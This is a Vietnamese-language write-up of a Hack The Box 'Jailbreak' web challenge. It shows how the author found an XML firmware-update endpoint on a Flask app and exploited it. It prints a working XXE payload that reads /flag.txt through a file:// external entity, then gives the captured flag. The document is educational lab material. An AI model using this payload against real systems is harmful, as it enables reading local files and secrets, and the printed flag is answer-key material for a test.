# Jailbreak — Writeup (HTB Try Out / Web) (Tiếng Việt)

## 1. Đề
Một challenge WEB (remote, không có file tải về), chơi qua trình duyệt.
Target: `http://154.57.164.73:31701`
Mục tiêu: đọc file `/flag.txt` trên server, flag dạng `HTB{...}`.
Giao diện mô phỏng "PIP-OS" (Pip-Boy của Fallout) gồm các tab STAT / INV / DATA / MAP / RADIO / ROM.

## 2. Kiến thức nền
- **XXE (XML External Entity)**: khi ứng dụng parse XML do người dùng cung cấp bằng parser
  lxml (Python) với resolve entity được bật, ta có thể định nghĩa entity `SYSTEM "file:///..."`
  để server đọc nội dung file cục bộ và chèn vào kết quả phản hồi.
- Flask (`Werkzeug/3.0.3`, `Python/3.12.3`) — nhận diện qua header `Server`.

## 3. Phân tích
- Header HTTP: `Server: Werkzeug/3.0.3 Python/3.12.3` → ứng dụng Python Flask.
- Trang `/rom` có form "Firmware Update" yêu cầu nhập XML, JS (`/static/js/update.js`)
  gửi nội dung XML tới `POST /api/update` với `Content-Type: application/xml`.
- Endpoint `/api/update` parse XML → điểm chèn XXE khả nghi.
- Lỗi đầu tiên: gửi kèm `<?xml version="1.0" encoding="UTF-8"?>` → server báo
  `Unicode strings with encoding declaration are not supported. Please use bytes input
  or XML fragments without declaration.` → xác nhận parser là lxml và cần bỏ declaration.

## 4. Vì sao hướng này
- Mục tiêu là "đọc /flag.txt" → hướng đọc file (file read) phù hợp nhất.
- Endpoint duy nhất nhận input có cấu trúc "file-based" là XML (`/api/update`) → XXE là
  vector tự nhiên để đọc file, không cần brute-force hay scan rộng.

## 5. Các bước
1. TRIAGE: curl các route (`/`, `/inventory`, `/data`, `/map`, `/radio`, `/rom`) → phát
   hiện trang `/rom` có form XML gửi `POST /api/update`.
2. Đọc `/static/js/update.js` → xác nhận format XML + endpoint.
3. Gửi payload XXE (không kèm XML declaration do lxml báo lỗi):
   ```xml
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///flag.txt">
   ]>
   <FirmwareUpdateConfig>
     <Firmware>
       <Version>&xxe;</Version>
       ...
     </Firmware>
   </FirmwareUpdateConfig>
   ```
4. Response: `"Firmware version HTB{...} update initiated."` → flag nằm trong `Version`.
5. Gửi lại lần 2 độc lập → flag giống hệt → xác nhận.

## 6. Flag
```
HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_6d45d44e5c2034af11b95b9d6def5c48}
```
